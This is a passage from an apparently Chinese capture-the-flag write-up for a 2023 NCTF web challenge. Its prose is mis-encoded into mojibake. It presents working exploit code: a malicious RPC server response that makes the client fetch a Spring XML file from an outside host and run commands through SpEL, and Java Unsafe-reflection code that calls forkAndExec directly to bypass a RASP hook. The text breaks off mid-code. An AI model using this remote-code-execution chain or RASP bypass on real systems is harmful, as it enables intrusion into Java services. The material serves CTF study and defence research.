<p>è¿™ä¸ªæ–¹æ³•ä¸»è¦ä¼šå¯¹ï¼Œåˆšåˆšä¼ å…¥çš„å­—ç¬¦ä¸²ä¾æ®<code>#</code>åˆ‡ç‰‡æˆä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œå½“æ•°ç»„çš„0,1é”®å€¼éƒ½ä¸ä¸ºnullæ—¶ï¼Œä¼šä»¥0å·é”®å€¼ä½œä¸ºç±»åï¼Œ1å·é”®å€¼ä½œä¸ºå­—ç¬¦ä¸²ä¼ å…¥ç±»ä¸­<br>æ‰€ä»¥è¿™é‡Œä¼šæƒ³åˆ°ç”¨springçš„ClassPathXmlApplicationContextæ–¹æ³•ï¼ŒåŠ è½½æ¶æ„çš„xmlæ–‡ä»¶</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/wrapunit.png" class="">

<p>springçš„ClassPathXmlApplicationContextå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.javaboy.org/2019/0801/spring-xml.html">spring bean</a>å’Œ<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">SpEL</a>ï¼Œä¸‹é¢æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ï¼Œè™½ç„¶ä¼šå› ä¸ºç±»å‹è½¬åŒ–æŠ¥é”™ï¼Œä½†æ˜¯è¿˜æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œç„¶åè¯•äº†è¿œç¨‹è·å–xmlä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        ClassPathXmlApplicationContext classPathXmlApplicationContext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;test.xml&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/calc.png" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/remote.jpg" class="">

<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬çœ‹çœ‹åˆ›å»ºä¸€ä¸ªæ¶æ„serverè¿”å›æˆ‘ä»¬éœ€è¦çš„å†…å®¹ï¼Œåˆšåˆšå…¨å±€æœç´¢Trowableçš„æ—¶å€™æˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°äº†æœ‰NettyRpcServerè¿™ä¸ªç±»ã€‚å’Œclientç«¯ä¸€æ ·ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>channelRead</code>æ–¹æ³•ï¼Œå‘ç°äº†å’Œ<code>MixUtils.unwrapException</code>ä¼ å…¥å­—ç¬¦ä¸²å¤„å‡ ä¹ç›¸ä¼¼çš„æ“ä½œï¼Œåªè¦<code>try</code>å‘ç”Ÿé”™è¯¯ï¼Œå°±ä¼šæ‰§è¡Œé‡Œé¢çš„<code>prepareResponse</code>å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠtryçš„å…¶ä»–å†…å®¹æ³¨é‡Šæ‰ï¼Œå•ç‹¬æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå¹¶æŠŠ<code>prepareResponse</code>å¦å¤–ä¸¤ä¸ªå­—ç¬¦ä¸²æ›¿æ¢æˆæˆ‘ä»¬éœ€è¦çš„å†…å®¹å³å¯ã€‚</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/evilser.png" class="">

<p>ä¸‹é¢å¼€å§‹ä¿®æ”¹æ¶æ„æœåŠ¡çš„è¿”å›ç±»ï¼Œå¼€å¯æœåŠ¡ï¼Œç„¶åclientè®¿é—®consumerï¼Œpocæ‰§è¡ŒæˆåŠŸ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Throwable</span>(<span class="hljs-string">&quot;daem0nu&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Throwable ee) &#123;<br>    List&lt;ByteBuffer&gt; res =<br>            prepareResponse(<span class="hljs-literal">null</span>, rmtVersion, RPCProtos.ResponseHeader.Status.FATAL,<br>                    <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>, <span class="hljs-string">&quot;http://10.0.0.127:9090/test.xml&quot;</span>);<br>    <span class="hljs-keyword">if</span> (res != <span class="hljs-literal">null</span>) &#123;<br>        dataPack.setDataLst(res);<br>        ctx.channel().writeAndFlush(dataPack);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;data&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>#&#123;T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/poc.jpg" class="">

<p>ç„¶åè¿˜æœ‰ä¸€ä¸ªunixprocessçš„raspï¼Œå‚è€ƒè¿™é‡Œçš„<a target="_blank" rel="noopener" href="https://www.secrss.com/articles/49044">5HookNative</a>ï¼Œé¢˜ç›®çš„<code>com.simplerasp</code>çš„<code>premain</code>æ‰§è¡Œåä»<code>com.simplerasp.handler</code>è·å–<code>RaspHandler</code>ï¼Œä¹Ÿå°±æ˜¯<code>java.lang.UNIXProcess</code>ï¼Œå¹¶åœ¨å…¶ä¸­æ–°å¢ä¸€ä¸ªåŠ¨æ€è§£æçš„nativeæ–¹æ³•<code>RASP_forkAndExec</code>ï¼Œé€šè¿‡<a target="_blank" rel="noopener" href="https://arthas.aliyun.com/doc/sm.html#%E4%BD%BF%E7%94%A8%E5%8F%82%E8%80%83">asthasçš„smæŸ¥çœ‹</a></p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/hook.png" class="">

<p>æˆ‘ä»¬æœ¬åœ°ç¼–è¯‘ä¸€ä¸ª<code>test.jar</code>ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼Œæˆ‘ä»¬ç”¨<code>SiampleRasp.jar</code>å¯¹<code>test.jar</code>hookä¹‹åï¼Œå†è¿œç¨‹è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹Raspæ˜¯å¦‚ä½•hookå’Œæ£€æµ‹åˆ°æ¶æ„æ–¹æ³•çš„æ‰§è¡Œçš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;test2&quot;</span>);<br>            InputStream inputStream=Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();<br>            InputStreamReader inputStreamReader=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream,<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            BufferedReader bufferedReader=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(inputStreamReader);<br>            String s=bufferedReader.readLine();<br>            System.out.println(s);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;EVIL!!!&quot;</span>);<br>            Thread.sleep(<span class="hljs-number">600000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è°ƒè¯•å‘ç°å…³é”®ä»£ç åœ¨<code>com.simplerasp.transformer.BaseTransformer</code>çš„<code>transform</code>æ–¹æ³•ï¼Œå®ƒéå†æ‰€è¿è¡Œjarå½“ä¸­æ‰€æœ‰è°ƒç”¨ï¼Œå¦‚æœåŒ¹é…åˆ°<code>java/lang/UNIXProcess</code>åˆ™è¿›å…¥<code>try</code>ï¼Œä¸€å¼€å§‹æ˜¯è°ƒç”¨<code>com.simplerasp</code>çš„<code>premain</code>æ¥hook<code>java.lang.UNIXProcess</code>ï¼Œè°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String _className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.className.replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>).equals(_className)) &#123;<br>        System.out.println(<span class="hljs-string">&quot;Found target class: &quot;</span> + <span class="hljs-built_in">this</span>.className);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-built_in">this</span>.className);<br>            CtClass[] ctParameterTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[<span class="hljs-built_in">this</span>.parameterTypes.length];<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.parameterTypes.length; ++i) &#123;<br>                ctParameterTypes[i] = pool.get(<span class="hljs-built_in">this</span>.parameterTypes[i].getName());<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isConstructor) &#123;<br>                <span class="hljs-type">CtBehavior</span> <span class="hljs-variable">ctBehavior</span> <span class="hljs-operator">=</span> ctClass.getDeclaredConstructor(ctParameterTypes);<br>                <span class="hljs-built_in">this</span>.raspTransform(ctClass, ctBehavior);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">CtBehavior</span> <span class="hljs-variable">ctBehavior</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-built_in">this</span>.methodName, ctParameterTypes);<br>                <span class="hljs-keyword">if</span> (Modifier.isNative(ctBehavior.getModifiers())) &#123;<br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> (CtMethod)ctBehavior;<br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">renameCtNativeMethod</span> <span class="hljs-operator">=</span> CtNewMethod.copy(ctMethod, ctClass, (ClassMap)<span class="hljs-literal">null</span>);<br>                    renameCtNativeMethod.setName(<span class="hljs-string">&quot;RASP_&quot;</span> + ctMethod.getName());<br>                    ctClass.removeMethod(ctMethod);<br>                    ctClass.addMethod(renameCtNativeMethod);<br>                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">hookCtNativeMethod</span> <span class="hljs-operator">=</span> CtNewMethod.copy(ctMethod, ctClass, (ClassMap)<span class="hljs-literal">null</span>);<br>                    hookCtNativeMethod.setModifiers(ctMethod.getModifiers() &amp; -<span class="hljs-number">257</span>);<br>                    hookCtNativeMethod.setBody(<span class="hljs-string">&quot;&#123; return &quot;</span> + renameCtNativeMethod.getName() + <span class="hljs-string">&quot;($$); &#125;&quot;</span>);<br>                    ctClass.addMethod(hookCtNativeMethod);<br>                    <span class="hljs-built_in">this</span>.raspTransform(ctClass, hookCtNativeMethod);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-built_in">this</span>.raspTransform(ctClass, ctBehavior);<br>                &#125;<br>            &#125;<br><br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> ctClass.toBytecode();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var13) &#123;<br>            var13.printStackTrace();<br>            <span class="hljs-keyword">return</span> classfileBuffer;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> classfileBuffer;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/hookdebug.png" class="">

<p>å½“è¾“å‡ºç¬¬äºŒä¸ªFound target classæ—¶premainå°±ç®—ç»“æŸäº†</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/kalihook.png" class="">

<p>è¾“å‡ºtest2æ—¶å°±å·²ç»è¿›å…¥test.jarçš„mainæ–¹æ³•äº†ï¼Œè¿™ä¸ªæ—¶å€™ä¼šç»§ç»­æ‰§è¡Œä¸Šé¢é‚£ä¸ª<code>transform</code>æ–¹æ³•å¯¹test.jarçš„è°ƒç”¨çš„æ–¹æ³•è¿›è¡Œæ£€æµ‹ï¼Œå½“æ£€æµ‹åˆ°<code>java.lang.ProcessImpl</code>æ—¶ï¼Œ<code>exec</code>è¢«æ£€æµ‹ä¸ºæ¶æ„æ–¹æ³•ï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œè¿™é‡Œå½“æ—¶æŒºè¯§å¼‚çš„ï¼Œæ˜æ˜è¦åŒ¹é…çš„æ—¶<code>java.lang.UNIXProcess</code>ï¼Œä½†æ˜¯<code>java.lang.ProcessImpl</code>ä¹Ÿè¢«åˆ¤ä¸ºæ¶æ„ï¼Œåæ¥å‚è€ƒäº†<a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/121438079">è¿™é‡Œ</a>ï¼Œè¯´é‚£ä¸¤ä¸ªç±»åœ¨JDK9ä¹‹åå°±åˆå¹¶äº†ï¼Œç­‰åŒäºä¸€ä¸ªï¼Œæ‰€ä»¥è¿™æ ·å°±è¯´å¾—é€šäº†</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/unix.png" class="">

<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/unxierr.png" class="">

<p>åˆ°è¿™é‡Œraspçš„æœºåˆ¶å°±å¤§æ¦‚æ¸…æ¥šäº†ï¼Œä¸‹é¢çœ‹çœ‹å¦‚ä½•ç»•è¿‡ï¼Œå‚è€ƒ<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh4am1/p/16780056.html">UnSafeåå°„æ–¹å¼ç»•è¿‡</a>å†™å‡ºå¦‚ä¸‹æµ‹è¯•ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argss)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><br>        String[] strs=&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<br><br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br><br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">// è®¾ç½®è®¿é—®æƒé™</span><br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br><br>        <span class="hljs-comment">// è·å–æœ¬åœ°æ‰§è¡Œç»“æœçš„è¾“å…¥æµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) 